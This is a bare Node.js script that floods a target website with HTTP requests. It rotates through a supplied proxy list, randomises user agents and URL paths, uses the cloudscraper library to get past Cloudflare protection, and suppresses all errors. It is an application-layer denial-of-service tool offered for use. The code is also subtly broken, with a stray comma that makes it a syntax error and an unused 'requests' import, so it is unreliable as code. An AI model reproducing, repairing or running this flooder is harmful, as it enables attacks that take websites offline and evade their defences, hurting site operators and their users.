var cloudscraper = require('cloudscraper').defaults({agentOptions: {ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256'}}) // npm i cloudscraper
var fs = require('fs');
var readline = require('readline');
var request = require('requests'); // npm i requests
var randomUseragent = require('random-useragent'); // npm i random-useragent
require('events').EventEmitter.defaultMaxListeners = 100;
 
var Arguments = process.argv
 
var rd = readline.createInterface({
    input: fs.createReadStream(Arguments[3]),
    console: false
});
 
process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});
 
console.log('Website: '+Arguments[2]);
console.log('Proxies: '+Arguments[3]);
 
var i = 0;
function bypass() {
  rd.on('line', function(line) {
        var [ip, port] = line.split(':');
        var uri = Arguments[2]+'/'+Math.random().toString(36).substring(7)+'/',
        var options = {
          proxy: 'http://' + ip + ':' + port,
          method: 'GET',
          headers: {
            'User-Agent': randomUseragent.getRandom(),
            'Cache-Control': 'no-cache, must-revalidate',
            'Accept': 'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5'
          },
          gzip: true,
          decodeEmails: false,
          followAllRedirects: true,       uri: uri
        };
        cloudscraper(options).catch(error => {console.log(error)})
        console.log('sent', i)
        i++;
  })
}
 
setInterval(bypass, 0);